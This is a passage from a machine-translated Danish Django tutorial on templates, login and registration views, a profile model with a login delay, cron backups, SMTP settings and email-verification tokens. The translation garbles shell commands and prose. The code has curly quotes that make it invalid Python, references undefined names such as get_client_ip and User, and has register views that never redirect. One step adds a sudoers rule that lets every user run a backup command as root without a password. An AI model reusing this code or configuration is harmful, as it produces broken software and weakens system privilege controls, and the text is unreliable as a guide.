{% block body %}
{% endblock %}
&lt;/body&gt;
&lt;/html&gt;
 </code></pre>Sørg for at kopiere CSS og JavaScript, .CSS- og .JS -filer, fordi vi har brug for JavaScript for at gøre vores websted mere funktionelt i fremtiden.

Lad os nu vende tilbage til Bash Shell og køre en hurtig kommando. Husk, at hvis du nogensinde har brug for at få adgang til det virtuelle miljø, skal du skrive kilde VENV/bin/aktivere. Dette giver dig mulighed for at installere Python -pakker lokalt på en måde, der lader Django få adgang til dem. For at give vores formularer genereret af Django Bootstrap -klasser, bruger vi en Python -pakke kaldet Crispy Forms. Vi kan downloade dette med følgende kommando<pre class="language-bash"><code>
pip install django-crispy-forms
</code></pre>Når dette er installeret, skal du tilføje det til indstillingerne.py<pre class="language-python"><code>
INSTALLED_APPS = [
    # … Tidligere kode her
    'crispy_forms',
]
</code></pre>Nu, tilbage i vores feedskabelon, kan vi fjerne nogle ting. Lad os fjerne begyndelsen og slutningen af ​​dokumentet og udskifte det med arv fra vores baseskabelon ved hjælp af udvidelse og blokdefinitionen. Vi tilføjer også en skabelonfilterimport med belastning og et skabelonfilter til formularen. Til sidst, lad os tilføje en bootstrap -klasse til knappen på formularen for at få den til at ligne en knap. Det skulle se sådan ud:<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% block body %}
{% load crispy_forms_tags %}
&lt;form method=”POST”&gt;
{% csrf_token %}
{{ form|crispy }}
&lt;button type=”submit” class=”btn btn-outline-primary”&gt;New Post&lt;/button&gt;
&lt;/form&gt;
&lt;hr&gt;
{% for post in posts %}
&lt;p&gt;{{ post.text }}&lt;/p&gt;
{% endfor %}
{% endblock %}
 </code></pre>Smuk! Det er allerede en hel del kode. Dernæst skal vi teste det ud og sørge for, at vi kan se, at alt ser godt ud, og at være sikker på, at alt fungerer korrekt. Kør serveren i henhold til tidligere instruktioner, og sørg for, at webstedet ser ud og fungerer i orden. Fantastisk job! Du er klar til at gå videre til det næste trin, hvor vi tilføjer bruger login -funktionalitet ved hjælp af lignende webadresser, formularer, visninger og skabeloner. Baseskabelonen er vigtig, og vi vil fortsætte med at ændre den og foretage ændringer efter behov, men lad os nu fokusere på at gøre vores websted mere sikkert ved at give brugerne mulighed for at logge ind med et brugernavn og adgangskode, og til sidst endnu vigtigere oplysninger om det Hjælper med at holde din app sikker og din egen konto kun tilgængelig af dig.

For at gøre dette skal vi bruge brugermodellen indbygget i Django. Brugermodellen er en databasemodel, ligesom vores indlæg, der kan gengives til at logge en bruger på webstedet. I fremtiden, inden vi implementerer webstedet til internettet, vil viUdvid denne model med andre modeller, der tilskrives den, og opbyg yderligere sikkerhedsforanstaltninger for det login, der er modstandsdygtige over for phishing. Vi begynder med at bruge nogle indbyggede loginformularer, som Django leverer. Lad os først oprette en ny app, som vi vil bruge til at gengive skabeloner og visninger til den grundlæggende login -side. Vi vil også oprette andre apps til at repræsentere de fortsatte loginudfordringer for at sikre appen, herunder en pincode, ansigtsgenkendelse, nær feltkommunikation, eksterne enheder, multi -faktor -godkendelse og fingeraftrykgenkendelse.

Vi har allerede talt om at starte en app. Fra vores bibliotek, inde i det virtuelle miljø, pas administrere.py disse<pre class="language-bash"><code>
python manage.py startapp users
</code></pre>Nu skal vi have et bibliotek til den nye app. Lad os starte med at oprette en visning i det bibliotek, der svarer til brugerlogin. Django har indbygget visninger til brugerlogin, men disse er ikke egnede til os, fordi vi har brug for en brugerdefineret visning, hvilket fortrinsvis er gjort med en definition.

I denne opfattelse starter vi med at kontrollere for en postanmodning, overføre anmodning.post til en loginform importeret fra Django, autentificere brugerkontoen og logge brugeren ind, inden du omdirigerer dem til vores feed -app.

Tilføj følgende kode i brugere/visninger.<pre class="language-python"><code>
from django.shortcuts import render, redirect
from django.urls import reverse
from django.contrib.auth.forms import AuthenticationForm, SetPasswordForm
from django.contrib.auth import authenticate, logout
from django.contrib.auth import login as auth_login
from django.contrib import messages

def login(request):
    if request.method == “POST”:
        username = request.POST['username'] # Få brugernavnet og adgangskoden fra POST -anmodningen
        password = request.POST['password'] # Autentificer brugeren
        user = authenticate(username=username, password=password)
        if user:
            auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend')
            messages.success(request, 'Your password was accepted. Please continue')
            return redirect(reverse('feed:feed'))
        else: messages.warning(request, 'Username or password incorrect. Please try again')
    return render(request, 'users/login.html', {'form': AuthenticationForm()})
</code></pre>Dette er alt hvad du behøver for en grundlæggende loginvisning. Lad os nu oprette en formular til visningen ved at udvide baseskabelonen. Vi starter med at oprette et nyt bibliotek til skabeloner i mappen Bruger.<pre class="language-bash"><code>
mkdir users/templates
mkdir users/templates/users
</code></pre>Nu skal vi være i stand til at redigere brugere/skabeloner/brugere/login.html. Mens vi er ved det, opretter vi en skabelon, der giver brugeren mulighed for at tilmelde sig.<pre class="language-bash"><code>
nano users/templates/users/login.html
</code></pre>Nu i skabelonen<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block content %}
&lt;form method="POST"&gt;
    {% csrf_token %}
    &lt;fieldset class="form-group"&gt;
        &lt;legend class="border-bottom mb-4 break"&gt;Log In&lt;/legend&gt;
        {{ form|crispy }}
    &lt;/fieldset&gt;
    &lt;div class="form-group"&gt;
        &lt;button class="btn btn-outline-info" type="submit"&gt;Login&lt;/button&gt;
    &lt;/div&gt;
&lt;/form&gt;
{% endblock %}
 </code></pre>Dette er det grundlæggende i en login -skabelon. Det er virkelig ligesom den anden skabelon i struktur, men den ser lidt anderledes ud, når den er gengivet. Vi kan kopiere denne kode for at opbygge en anden meget lignende skabelon kaldet Register.html, hvor vi ændrer ordlyden og bruger en ny formular, vi bygger. Lad os lave skabelonen først. Rediger brugere/skabeloner/brugere/register.html og tilføj følgende kode:<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block content %}
&lt;form method="POST"&gt;
    {% csrf_token %}
    &lt;fieldset class="form-group"&gt;
        &lt;legend class="border-bottom mb-4 break"&gt;Create an account&lt;/legend&gt;
        {{ form|crispy }}
    &lt;/fieldset&gt;
    &lt;div class="form-group"&gt;
        &lt;button class="btn btn-outline-info" type="submit"&gt;Register&lt;/button&gt;
    &lt;/div&gt;
&lt;/form&gt;
{% endblock %}
 </code></pre>Lad os nu opbygge en formular til vores brugerregistrering og cirkel tilbage til visningerne, før vi opgraderer vores bruger login med en model. Vi vil gøre denne form til grundlæggende til at begynde med, men indarbejde flere detaljer og sikkerhedsfunktioner såsom aftaler og CAPTCHA i fremtiden. Rediger formularerne med Nano -brugere/formular. Py, og tilføj følgende kode.<pre class="language-python"><code>
from django import forms
from django.contrib.auth.models import User
from django.contrib.auth.forms import UserCreationForm

class UserRegisterForm(UserCreationForm):
    email = forms.EmailField()

    class Meta:
        model = User
        fields = ['username', 'email', 'password1', 'password2']
</code></pre>Så vi har en anden form her, der fungerer temmelig enkelt. Det er en brugerregisterformular med et brugernavn, e -mail og adgangskode samt et bekræftende adgangskodefelt. Bemærk, at denne formular ikke udvider den almindelige form.formklasse, det er en modelform, hvilket betyder, at den har en meta. Et felt defineres lige det samme, og klassen meta definerer den model, formularen svarer til resten af ​​de oplysninger, der vil blive skrevet til formularen. Det meste af dette findes allerede i Djangos indbyggede brugercreationform, så vi vil bruge det som grundlag for klassen (bestået i parentesen).

Dernæst undersøger vi visningen for at registrere en bruger, nu hvor vi har en formular og en skabelon. Dette er en Modelform, ligesom den i den nye eftervisning. Rediger brugere/visninger.py og tilføj følgende kode:<pre class="language-python"><code>
# ... beløb
from .forms import UserRegisterForm

def register(request):
    if request.method == “POST”:
        form = UserRegisterForm(request.POST)
        if form.is_valid():
            user = form.save()
            messages.success(request, 'Welcome to the app, {}.'.format(user.username))
    return render(request, 'users/register.html', {'form': UserRegisterForm})
</code></pre>Dette er alt, hvad vi har brug for for at få en bruger registreret, men vi bør have mere information. Vi vil gerne vide den tid, som brugeren registrerede, hvornår de var sidst på webstedet, nogle oplysninger om dem, som en biografi, tidszone osv. Også, vi bliver nødt til at opdatere vores feed -model, post, for at redegøre for brugeren Model og attributindlæg til hver bruger. For at gøre det, opdaterer vi modellerne.py i begge apps. Lad os starte med at redigere fodermodellen. Det skal se sådan ud nu:<pre class="language-python"><code>
from django.db import models # ... beløb
from django.contrib.auth.models import User

class Post(models.Model):
    id = models.AutoField(primary_key=True)
    author = models.ForeignKey(User, on_delete=models.CASCADE, null=True, blank=True, related_name='posts') # Tilføj i denne linje
    text = models.TextField(default='')
</code></pre>Vær opmærksom på den anden linje, der blev føjet til filen. Dette er en fremmed nøgle, der tilskriver hvert indlæg til en enkelt bruger pr. Indlæg, så vi kan sørge for, at vi gemmer indlægene på en bruger-per-bruger-basis, og der kan ikke laves noget indlæg uden at tilskrive det til en bruger. Vi definerer denne udenlandske nøgle med den klasse, den repræsenterer, et slettargument for at sikre, at indlæg slettes med brugere, nul og tomme argumenter for at sikre, at vi kan fjerne brugeren om nødvendigt, og for at imødekomme for manglen på en bruger på indlæg, vi allerede Oprettet og et relateret navn, som vi kan bruge til at henvise til de post -objekter, som brugeren opretter. Dette relaterede navn, i modsætning til Post.Author, forfatteren af ​​The Post, giver os bruger, der sendte selve posten. Vi kan nu få de indlæg, en bruger lavet af at køre bruger.posts.all () eller forfatter.posts.all ().

Lad os nu gøre vores login mere modstandsdygtige. Vi kan allerede gøre vores websted meget mindre sårbart over for phishing ved blot at begrænse antallet af gange, vi tillader et login tilSite, dette er ret let. Lad os også begynde at gemme nogle oplysninger om hver bruger før, når vi fortsætter med at udvikle vores app. Redigering af brugere/modeller.py, tilføj følgende<pre class="language-python"><code>
from django.db import models
from django.contrib.auth.models import User
from django.utils import timezone

class Profile(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE, null=True, blank=True, related_name='profile')
    account_created = models.DateTimeField(default=timezone.now)
    last_seen = models.DateTimeField(default=timezone.now)
    can_login = models.DateTimeField(default=timezone.now)
    preferred_name = models.CharField(max_length=20,default='', null=True, blank=True)
    bio = models.TextField(blank=True, default='')
</code></pre>Bemærk, at denne model temmelig ligner postmodellen. Vi har en ekstra import, tidszone, som giver os mulighed for at indstille misligholdelser på datetime -felterne, og vi har også en karakterfeild og textfield som indlægget. Brug af alle disse tidsstempler hjælper os med at sikre webstedet og forstå dets anvendelse, og tekstfelterne lader os give information om hver bruger eller forfatter på webstedet. OneToonefield skal være den eneste mindre overvejelse, det opfører sig nøjagtigt det samme som en forudgående, men med kun en pr. Efterfølgende model. På denne måde har brugeren kun en profil, mens de muligvis har mange indlæg.

Lad os nu forbedre vores login og registrere visninger for at redegøre for profilen. Rediger først brugere/views.py og fokuser på registervisningen:<pre class="language-python"><code>
# ... beløb
from .forms import UserRegisterForm

def register(request):
    if request.method == “POST”:
        form = UserRegisterForm(request.POST)
        if form.is_valid():
            user = form.save()
            Profile.objects.create(user=user) # Sørg for at tilføje denne linje for at oprette en profil for brugeren
            messages.success(request, 'Welcome to the app, {}.'.format(user.username))
    return render(request, 'users/register.html', {'form': UserRegisterForm})
</code></pre>Dette skaber simpelthen en profil for brugeren uden at udfylde nogen af ​​oplysningerne. Nu ønsker vi at sikre, at brugerkontoen ikke kan logges ind for ofte, eller i det mindste kan adgangskoder ikke prøves for ofte, så lad os opdatere login -visningen.<pre class="language-python"><code>
# ... beløb
from .models import Profile
from django.utils import timezone
import datetime

def login(request):
    if request.method == “POST”:
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(username=username, password=password)
        if user and user.profile.can_login &lt; timezone.now(): # Bemærk, at vi nu kontrollerer, om brugeren kan logge ind
            auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend')
            messages.success(request, 'Your password was accepted. Please continue.')
            return redirect(reverse('feed:feed'))
        else: # Hvis login ikke lykkedes,
            messages.warning(request, 'Username or password incorrect. Please try again.')
            user = User.objects.filter(username=username).first() # Dette er den del, hvor vi opdaterer brugerprofilen
            if user: 
                profile = user.profile
                profile.can_login = timezone.now() + datetime.timedelta(seconds=15) # Så de kan ikke logge ind igen i et par sekunder
                profile.save()
    return render(request, 'users/login.html', {'form': AuthenticationForm()})
</code></pre>Dette er det grundlæggende grundlæggende af sikkerhed. Sørg for, at webstedet ikke er sårbart over for nogen, der blot prøver enhver mulig adgangskodekombination, eller endda et par af dem på samme tid. Dette vil ikke være frustrerende for den almindelige bruger, der kender deres adgangskode og bare logger på et par enheder, men det vil holde adskillige phishing -robotter ude af appen. Bemærk, at vi tilføjede en IF -sætning med en variabel, can_login, det skulle være en tid i fortiden og opdatere den med hvert mislykket login ved hjælp af det samme brugernavn. På denne måde kan en ondsindet bruger ikke gætte en adgangskode hvor som helst i nærheden af ​​så hurtigt. Antallet af sekunder i datetime.timedelta () kan også opdateres, og webstedet vil være mere elastisk, men alligevel lidt mindre anvendeligt med flere sekunder. Jeg anbefaler 15 til at starte med.

Husk, at vi byggede et backup -script for at gemme vores arbejde, så lad os gå videre og tilbage op, hvad vi har hidtil for at sikre, at vi har alt gemt. Kør kommandoen:<pre class="language-bash"><code>
sudo backup
</code></pre>Endnu en gang sparer dette dit arbejde indtil videre. Jeg anbefaler at køre hyppige sikkerhedskopier for at gemme dit arbejde, og du vil måske endda køre et backupjob automatisk. Du kan gøre dette ved hjælp af et UNIX -værktøj kaldet Cron. For at aktivere dette værktøj skal du køre følgende kommando og indtaste din adgangskode:<pre class="language-bash"><code>
sudo crontab -e
</code></pre>Hvis du ikke allerede har valgt mulighed 1 til Nano, skal den teksteditor, du allerede skal være bekendt med, og rulle til bunden af ​​filen ved hjælp af piletasterne. Tilføj følgende linje:<pre class="language-bash"><code>
0 * * * * sudo backup
</code></pre>Cron bruger formatintet, time, dag i måned, måned, ugedag, hvor et * eller et nummer repræsenterer, hvornår man skal køre kommandoen. Ved hjælp af en 0 til minut og * for resten af ​​indstillingerne kan vi køre en kommando i det første minut af hver time i starten af ​​minut. Dette giver os mulighed for automatisk at tage backup af koden. Alle Crons job, når de udføres med Sudo Run som rod, så vi behøver ikke at indtaste en adgangskode hver time.

For at gøre det lettere at sikkerhedskopiere vores kode uden at bruge en adgangskode, lad os deaktivere adgangskoden til vores backup -kommando. Vi vil gøre dette ved at udføre følgende kommando og indtaste en adgangskode:<pre class="language-bash"><code>
sudo visudo
</code></pre>Lad os nu rulle til bunden af ​​filen og tilføje en anden linje:<pre class="language-bash"><code>
ALL ALL=NOPASSWD: /bin/backup
</code></pre>Dette lader os køre kommandoen "backup" som enhver bruger uden en adgangskode. Formatet til dette er let, bare præfiks linjen med “alle alle = nopasswd:/bin/” og slutter med kommandoen, for eksempel/bin/backup, der findes i/usr/bin/.

Lad os nu begynde at arbejde med e -mail. E -mail er virkelig vigtig for websteder, fordi det er en måde at holde et websted mere sikkert på, verificere, at brugerne er rigtige mennesker og endda markedsprodukter eller tjenester til kunderne. Mange mennesker, der hyppige internettet, tjekker deres e -mail dagligt og modtager alle mulige marketing -e -mailer om produkter og tjenester, de er interesseret i. Der er et par muligheder, når det kommer til at aktivere e -mail på et Django -websted, og du er velkommen til at vælge Uanset hvad der fungerer bedst for dig.

Først kan du betale for en e -mail -service, der giver dig mulighed for at sende e -mail fra dit domæne og kræver minimal kode. Der er mange tjenester, der tilbyder dette, såsom Google Workspace, SendInblue, MailGun og mere.

Ellers er du godt uden for at byggeDin egen e -mail -service på din server fra bunden. Jeg anbefaler denne mulighed, selvom den er mere kode og kan kræve særlig hosting. Du vil ikke være i stand til at starte en mailserver fra din hjemmecomputer sandsynligvis, så lad os gå videre og undersøge konfigurationen og koden for at sende e -mail, før vi starter en server i skyen og opretter vores egen mailserver inden for.

Rediger først indstillinger.py med følgende<pre class="language-bash"><code>
nano app/settings.py
</code></pre>Hvor app er navnet på den app, du oprettede med StartApp.

Tilføj følgende linjer:<pre class="language-python"><code>
SITE_NAME = 'Django App'

EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
EMAIL_HOST = 'localhost'
EMAIL_PORT = 587
EMAIL_USE_TLS = True
EMAIL_ADDRESS = username@server.com'
EMAIL_HOST_USER = 'username'
EMAIL_HOST_PASSWORD = config['EMAIL_HOST_PASSWORD']
DEFAULT_FROM_EMAIL = '{} &lt;{}&gt;'.format(SITE_NAME, EMAIL_HOST_USER)
</code></pre>Sørg for at ændre disse, når du er klar til at implementere din app, vi vil besøge dette senere. Indstillingen for e -mail_address skal være den e -mail, du gerne vil sende fra, og adgangskoden (e -mail_host_password) skal indstilles til den adgangskode, du genererer til serveren. Jeg indlæser adgangskoden fra en konfigurationsfil for at holde den ude af koden ved hjælp af følgende logik over disse linjer i indstillinger.py:<pre class="language-python"><code>
import os
import json
with open('/etc/config.json') as config_file:
    config = json.load(config_file)
</code></pre>Derefter har jeg oprettet en JSON -fil med konfigurationen i /etc/config.json ved hjælp af Nano som følger.

For at redigere filen:<pre class="language-bash"><code>
sudo nano /etc/config.json
</code></pre>Tilføj følgende linjer:<pre class="language-bash"><code>
{
	“EMAIL_HOST_PASSWORD”: “&lt;some password here&gt;”
}
</code></pre>Vi vil fortsætte med at redigere konfigurationsfilen og tilføje alle de adgangskoder og nøgler, vi vil bruge i appen. Lad os for tiden hurtigt undersøge, hvordan du sender e -mail ved hjælp af Python. Lad os først oprette en skabelon til en verifikations -e -mail, vi kan sende til vores brugere, og placere den i mappen Brugerskabeloner. Denne skabelon skrives i HTML.<pre class="language-bash"><code>
nano users/templates/users/verification_email.html
</code></pre>
<pre class="language-markup"><code> 
&lt;h1&gt;Django App - Verify Your Email&lt;/h1&gt;
&lt;p&gt;Dear {{ user.username }},&lt;/p&gt;
&lt;p&gt;To verify your email, please &lt;a href="{{ base_url }}{% url 'users:activate' uidb64=uid token=token %}"&gt;click here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Alternatively, you can paste the following link in your browser's address bar:&lt;/p&gt;
&lt;p&gt;{{ base_url }}{% url 'users:activate' uidb64=uid token=token %}&lt;/p&gt;

&lt;p&gt;The link will expire in 30 minutes.&lt;/p&gt;
&lt;p&gt;If you have not requested a verification email you can simply ignore this email.&lt;/p&gt;
&lt;p&gt;See you there,&lt;/p&gt;
&lt;p&gt;Daisy&lt;/p&gt;
 </code></pre>Denne e -mail er ret enkel. Det tager en kontekst af en bruger, basis -URL'en til webstedet og et bruger -id og token, der bruges til at verificere brugerens e -mail. Sørg for at definere basis -URL'en i indstillinger.py, før vi skriver nogle Python -kode for at gengive skabelonen. Gå videre og tilføj følgende linjer til app/indstillinger.py, nær starten.<pre class="language-python"><code>
SITE_NAME = 'Django App'
PROTOCOL = 'https'
DOMAIN = 'example.com'

BASE_URL = PROTOCOL + '://' + DOMAIN
</code></pre>Til sidst, når dit websted er klar til internettet og du implementerer det, vil du definere dit domæne som det domænenavn, du køber for at repræsentere webstedet. Dette er det navn, du vil indtaste Navbar for at få adgang til dit websted. I øjeblikket kan du forlade domænet tomt eller bruge en pladsholder. Du vil også ændre webstedet_navnet til et navn, du vil give dit websted, efter at du vælger. 

Før vi sender e -mail, lad os oprette en tokengenerator, så vi kan have en kontosaktiveringstoken, der aldrig udløber. Vi kan gøre dette ved at opbygge og importere en kontosaktiveringstoken, der ligner følgende. Rediger filen:<pre class="language-bash"><code>
nano users/tokens.py
</code></pre>Tilføj følgende kode:<pre class="language-python"><code>
from django.contrib.auth.tokens import PasswordResetTokenGenerator
import six
class TokenGenerator(PasswordResetTokenGenerator):
    def _make_hash_value(self, user, timestamp):
        return (
            six.text_type(user.pk) + six.text_type(timestamp)
        )
account_activation_token = TokenGenerator()
unsubscribe_token = TokenGenerator()
</code></pre>Denne grundlæggende tokengenerator genererer et token, vi kan sende brugeren i en URL, og brugeren kan bruge til at verificere deres e -mail og aktivere deres konto.

Lad os derefter se, hvordan vi sender en e -mail. Brug af Nano, rediger brugere/e -mail.py.<pre class="language-bash"><code>
nano users/email.py
</code></pre>At sende verifikationen HTML -e -mail vil se sådan ud:<pre class="language-python"><code>
from django.contrib.auth import get_user_model
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.contrib.sites.shortcuts import get_current_site
from django.core.mail import send_mail
from django.template.loader import render_to_string
from django.utils.encoding import force_bytes
from django.core.mail import EmailMultiAlternatives
from django.shortcuts import render
from .tokens import account_activation_token
from django.template.loader import render_to_string
from django.utils.html import strip_tags
from django.template import Template, Context
from django.conf import settings
import traceback

def send_verification_email(user):
    User = get_user_model()
    mail_subject = '[{}] Activate your account.'.format(settings.SITE_NAME)
    html_message = render_to_string('users/verification_email.html', {
        'user': user,
        'domain': settings.DOMAIN,
        'protocol': 'https',
        'uid': urlsafe_base64_encode(force_bytes(user.pk)),
        'token': account_activation_token.make_token(user),
    })
    send_html_email(user, mail_subject, html_message)
</code></pre>Dette er ret enkelt. Vi importerer de funktioner, vi har brug for for at sende e -mailen, gengive e -mailen med skabeloner og vores indstillinger, og derefter definerer vi e -mailen med skabelonnavnet og sender den til brugeren ved hjælp af en funktion. Du vil bemærke, at vi ikke har defineret funktionen til at sende mailen, send_html_email, men lad os skrive dette under koden, vi allerede har tilføjet brugere/e -mail.py<pre class="language-python"><code>
def send_html_email(user, mail_subject, html_message):
    to_email = user.email
    username = user.username
    if to_email == '':
        return None
    unsub_link = settings.BASE_URL + user.profile.create_unsubscribe_link()
    html_message = html_message + "&lt;p&gt;&lt;a href=\"" + unsub_link +  "\" + title=\"Unsubscribe from " + settings.SITE_NAME + " emails\"&gt;Unsubscribe&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"
    msg = EmailMultiAlternatives(mail_subject, strip_tags(html_message), settings.DEFAULT_FROM_EMAIL, [to_email], headers={'List-Unsubscribe' : '&lt;' + unsub_link + '&gt;'},)
    msg.attach_alternative(html_message, "text/html")
    profile = user.profile
    try:
        msg.send(fail_silently=False)
        if not profile.email_valid:
            profile.email_valid=True
            profile.save()
    except:
        profile.email_valid=False
        profile.save()
</code></pre>Dette er lidt mere kompliceret, og vi er ikke klar til at køre al denne kode endnu. Bemærk, at vi definerer en usub_link, det link, som brugeren kan bruge til at afmelde dig fra vores e -mails. Dette er vigtigt, fordi brugerne bliver nødt til at være i stand til at fravælge vores e -mails, medmindre de vil se dem til enhver tid. Vi tilføjer også et tekstalternativ til vores meddelelse, som er HTML -meddelelsen strippet af HTML -tags. Til sidst kontrollerer vi, om den sendte e -mail, og hvis den ikke gjorde det, markerer vi i brugerens profil, at deres e -mail ikke er gyldig.

Lad os flytte tilbage til brugermodellerne, så vi kan få alt dette til at fungere. Vi er nødt til at definere en funktion til at generere et link til afmelding og definere et boolsk felt for at markere, at brugerens e -mail ikke er gyldig.

Tilføj først følgende import til toppen af ​​brugere/modeller.py<pre class="language-bash"><code>
nano users/models.py
</code></pre>
<pre class="language-python"><code>
# ...
from django.core.signing import TimestampSigner, BadSignature, SignatureExpired
from django.urls import reverse
</code></pre>Lad os derefter tilføje funktioner til brugermodellen for at lave token og kontrollere det token, der bruges til at aktivere e -mailen, såvel som feltet for at gemme, om brugeren med succes modtager deres mail. Tilføj følgende kode til slutningen af ​​modellen (indrykket kode) i brugere/modeller.<pre class="language-python"><code>
# ...
    email_valid = models.BooleanField(default=True)
    
    def make_token(self):
        return TimestampSigner().sign(self.user.username)

    def check_token(self, token):
        try:
            key = '%s:%s' % (self.user.username, token)
            TimestampSigner().unsign(key, max_age=60 * 60 * 24 * 30) # Gyldig i 30 dage
        except (BadSignature, SignatureExpired):
            return False
        return True

    def create_unsubscribe_link(self):
        username, token = self.make_token().split(":", 1)
        return reverse('users:unsubscribe', kwargs={'username': username, 'token': token,})
</code></pre>Dette er temmelig enkelt, vi bruger en tidsstempler, som er et grundlæggende kryptografiske værktøj, til at skabe et token, der udløber efter en bestemt tidsperiode, og vi bruger også en anden funktion til at kontrollere, om den er gyldig. Vi bruger disse tokens to gange, en gang til at verificere e -mailen og en gang til et afmeldingslink. 

Nu hvor vi har disse, er den sidste af det arbejde, vi skal gøre, i visningerne. Inden for brugere/visninger. Py, lad os tilføje visninger for at verificere e -mail -adressen og til at afmelde dig.<pre class="language-bash"><code>
nano users/views.py
</code></pre>Tilføj først følgende import. Jeg kastede et par ekstra, så vi behøver ikke at importere flere genstande igen senere.<pre class="language-python"><code>
from django.contrib.auth import logout
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.models import User
from django.utils.encoding import force_str
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
import json
import requests
import datetime, traceback
from django.contrib import messages
from .models import Profile
from django.utils import timezone
from django.views.decorators.cache import never_cache
from .email import send_verification_email # Sørg for at importere bekræftelsesfunktionen til verifikations e -mail
from django.contrib.auth.decorators import login_required
from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin
from django.utils.decorators import method_decorator
from django.http import HttpResponseRedirect
from django.conf import settings
from django.utils import timezone
import datetime
import pytz
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse
from django.contrib.auth.tokens import default_token_generator
from django.utils.http import urlsafe_base64_decode
from .tokens import account_activation_token
</code></pre>Du har muligvis allerede nogle af disse import, men det skader ikke at gentage dem. Du bliver nødt til at importere bekræftelsesfunktionen for verifikations -e -mail såvel som Account_Activation_Token fra Brugere.Tokens, blandt andre import.

Tilføj nu i bunden af ​​filen følgende kode:<pre class="language-python"><code>
def unsubscribe(request, username, token):
    user = get_object_or_404(User, username=username)
    if((request.user.is_authenticated and request.user == user) or user.profile.check_token(token)):
        # Afmeld dem
        profile = user.profile
        profile.subscribed = False
        profile.save()
        return render(request, 'users/unsubscribe.html')
    # Ellers omdirigere til login -siden
    messages.warning(request,f'Your unsubscribe link has expired. Please log in to unsubscribe.')
    next_url = reverse('users:unsubscribe', kwargs={'username': username, 'token': token,})
    return HttpResponseRedirect('%s?next=%s' % (reverse('login'), next_url))

def activate(request, uidb64, token):
    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)
    except(TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None
    ip = get_client_ip(request)
    if user is not None and account_activation_token.check_token(user, token):
        user.profile.email_verified = True
        user.profile.save()
        user.save()
# SendWelcomeEmail (anmodning, bruger)
        messages.success(request, f'Thanks for confirming your email! You can now log into your account, and a welcome email has been sent to you.')
        return redirect(user.profile.create_face_url())
    else:
        messages.success(request, f'Your activation link has expired. Please request a new activation link.')
        return redirect('verify:verify')

def resend_activation(request):
    if request.method == 'POST':
        form = ResendActivationEmailForm(request.POST)
        email = request.POST['email']
        try:
            user = User.objects.get(email=email)
            send_verification_email(user)
            messages.success(request,'Your verification email sent. Please click the link in your email to verify your account.')
            return redirect(reverse('verify:verify'))
        except:
            messages.warning(request,f'Your email is not correct. Please try again.')
    else:
        form = ResendActivationEmailForm()
    return render(request,'users/resend_activation.html',{'form': form, 'title': 'Resend Activation', 'small': True})
</code></pre>Dette er en masse kode. Lad os nedbryde det. Den første funktion, rene og enkle, afmelder brugeren fra mailinglisten. Den anden funktion aktiverer deres e -mail, og du vil bemærke, at jeg tilføjede en kommenteret funktion, SendWelcomeEmail. Du er velkommen til at bruge en e -mail -skabelon og funktionsdefinition for at sende en velkomst -e -mail, jeg har bare ikke endnu. Den sidste funktion, jeg kastede ind, er vigtig, fordi aktivering -e -mails udløber. Derfor bliver vi nødt til at sende aktiverings -e -mailen noget af tiden. Vi kan bruge en grundlæggende formular til dette og ringe til funktionen for at sende verifikations -e -mailen. Før vi gør dette, lad os sørge for, at det bliver sendt i første omgang ved at tilføje et funktionsopkald til registervisningen. Tilføj denne linje lige før omdirigeringen i registervisningen, DEF Register, i brugere/visninger.py.<pre class="language-bash"><code>
nano users/views.py
</code></pre>
<pre class="language-python"><code>
#  … (after) def register(request):
            send_verification_email(user)
# ... (før) Omdirigering (
</code></pre>Du behøver ikke at tilføje de første og sidste linjer i dette kodestykket, bare sørg for, at registervisningen sender verifikations -e -mailen til brugeren. Det skal se sådan ud:<pre class="language-python"><code>
# ... import
from .forms import UserRegisterForm

def register(request):
    if request.method == “POST”:
        form = UserRegisterForm(request.POST)
        if form.is_valid():
            user = form.save()
            send_verification_email(user) # Sørg for at tilføje denne linje!
            messages.success(request, 'Welcome to the app, {}.'.format(user.username))
    return render(request, 'users/register.html', {'form': UserRegisterForm})
</code></pre>Nu skal vi tilføje en formular for at sende aktiverings -e -mailen igen. Tilføj følgende formular i brugere/formular.<pre class="language-python"><code>
# ... (beløb)
class ResendActivationEmailForm(forms.Form):
    email = forms.EmailField(required=True)
</code></pre>Vi har også brug for en skabelon, der svarer til denne formular til e -mail -aktivering. Lad os tilføje denne skabelon i. Rediger filen:<pre class="language-bash"><code>
nano users/templates/users/resend_activation.html
</code></pre>Tilføj derefter følgende kode til filen.<pre class="language-python"><code>
{% extends 'base.html' %}
{% block content %}
{% load crispy_forms_tags %}
        &lt;form method="POST"&gt;
            {% csrf_token %}
            &lt;fieldset class="form-group"&gt;
                &lt;legend class="border-bottom mb-4"&gt;Resend activation email&lt;/legend&gt;
                {{ form|crispy }}
            &lt;/fieldset&gt;
            &lt;div class="form-group"&gt;
                &lt;button class="btn btn-outline-secondary" type="submit"&gt;Resend activation email&lt;/button&gt;
            &lt;/div&gt;
        &lt;/form&gt;
{% endblock %}
</code></pre>Whew, det er meget! Nu, når vi implementerer koden til vores server, vil vi være i stand til at sende HTML -e -mail og aktivere brugerkonti med et klik i e -mailen. Vi ønsker måske også at sende en simpel velkomst -e -mail, så lad os se, hvordan du gør det. Tilbage i brugere/e -mail.py, tilføj følgende kode:<pre class="language-python"><code>
def sendwelcomeemail(user):
    User = get_user_model()
    html = open('{}/users/welcome_email.html'.format(settings.BASE_DIR)).read()
    subject = 'Welcome to ' + settings.SITE_NAME + ', {{ username }}!'
    template = Template(html)
    subjtemplate = Template(subject)
